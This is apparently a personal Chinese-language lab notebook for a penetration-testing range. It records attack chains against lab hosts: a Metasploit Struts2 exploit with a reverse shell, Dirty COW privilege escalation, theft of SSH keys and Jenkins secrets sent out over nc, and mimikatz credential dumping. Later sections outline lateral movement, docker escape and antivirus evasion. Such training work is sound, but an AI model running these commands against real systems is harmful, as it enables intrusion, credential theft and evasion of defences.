# 打靶

## THP-CSK

- 信息收集

  - nmap 172.16.250.0/24

  ![Snipaste_2024-07-06_22-12-38](C:\Users\85885\Documents\web\笔记\截图\Snipaste_2024-07-06_22-12-38.png)

- Web DMZ权限-利用struts2漏洞

  - use exploit/multi/http/struts2_content_type_ognl

    set payload linux/x64/meterpreter/reverse_tcp

    set rhosts 172.16.250.10

    set lhost 172.16.250.128

    run

  - 提权

    - upload /root/dirtycow-mem.c /tmp

      shell

      gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread

      python3 -c "import pty;pty.spawn('/bin/bash')"

      ./dirtycow-mem

    - 维持稳定

      - echo 0 > /proc/sys/vm/dirty_writeback_centisecs

        echo 1 > /proc/sys/kernel/panic && echo 1 > /proc/sys/kernel/panic_on_oops && echo 1 > /proc/sys/kernel/panic_on_unrecovered_nmi && echo 1 > /proc/sys/kernel/panic_on_io_nmi && echo 1 > /proc/sys/kernel/panic_on_warn

    - 密钥对横向

      - cat ~/.bash_history

        cp ~/.ssh/id_rsa /tmp/id_rsa

        chmod 777 id_rsa

        以上使用靶机终端

        退出终端使用以下命令

        download  /tmp/id_rsa /root/id_rsa

        chmod 0600 id_rsa

        ssh -i id_rsa root@172.16.250.30

      - 结束后使用bg将第一个目标机放入后台

- Jenkins DMZ权限

  - 信息收集

    - netstat -anpt，发现8080服务开启，通过10建立sock节点与30通讯

  - 添加路由

    - run autoroute -p
    - run post/multi/manage/autoroute

  - 建立节点

    - use auxiliary/server/socks_proxy

      vim /etc/proxychains4.conf

  - 攻击Jenkins

    - nc -lvp 1234 > master.key（本机反向监听）

      nc 172.16.250.128 1234 < /home/jenkins/secrets/master.key（jenkins目标机）

    - nc -lvp 1234 > hudson.util.Secret

      nc 172.16.250.128 1234 < /home/jenkins/secrets/hudson.util.Secret

    - nc -lvp 1234 > credentials.xml

      nc 172.16.250.128 1234 < /home/jenkins/credentials.xml

    ![Snipaste_2024-07-06_22-23-35](C:\Users\85885\Documents\web\笔记\截图\Snipaste_2024-07-06_22-23-35.png)

    - 破解密钥
      - python decrypt.py master.key hudson.util.Secret credentials.xml

- Database DMZ权限获取

  - 密码横向
    - ssh db_backup@172.16.250.50

  - 提权
    - sudo su

## VPC1





## VPC2





## VPC3

- Web1	
  - 通过redis配合密钥对连接
  - 通过攻击机反向shell上线

- Web2
  - 直接通过历史命令连接
  - 通过Web1正向shell上线
- Src-Web
  - 在Web2设置代理
  - 敏感文件泄露（www.rar）mssql账号密码
  - 通过MDUT连接数据库，上传Web2反向shell上线
  - 使用setspb -T rootkit.org -q */*
  - 上传mimikatz获得hash，并用hashcat爆破明文密码
- Exchange2013
  - 配置本地hosts将DC名指向IP
  - 再次设置代理
  - 通过CVE-2020-0688横向移动
  - 上传mimikatz获得hash

- DF
  - 借助wmiexex横向移动
  - DF免杀bypass



## VPC4

- docker
  - shiro利用
    - 利用后存马上线哥斯拉webshell
  - docker逃逸
    - 特权模式下的虚拟目录挂挂载
  - 拿下主机权限
    - 利用ssh密钥对
  - 拿下shell
    - 反向后门
- 通达OA
  - OA漏洞
    - 配合利群工具箱拿下蚁剑webshell
  - 配合docker拿下反向shell
  - 横向移动
    - 密码喷射
- Sqlserver
  - 通达OA直接横向移动拿下
- Webserver
  - 直接通过外网连接
  - 360免杀
    - cs生成raw内容的.bin后门
    - 使用RUST和混淆加密-编译加载器+密文

- DC
  - 票据连接
    - 通过Sqlserver中的历史遗留票据，通过PTT横向移动
  - 复制后门，创建计划任务
  - msf监听
    - exploit -j
  - 执行计划任务上线

## VPC5

- DMZ

  - 上线shell-shiro利用
    - headdump泄露-JDumpSpider
  - 360免杀
    - cs生成raw内容的.bin后门
    - 使用RUST和混淆加密-编译加载器+密文
      - cargo build --release

- 卡巴斯基

  - 上线shell
    - smbexec
      - 反弹cmd-下载后门
      - certutil原始命令绕过
    - IPC
      - 计划任务-copy执行后门

  

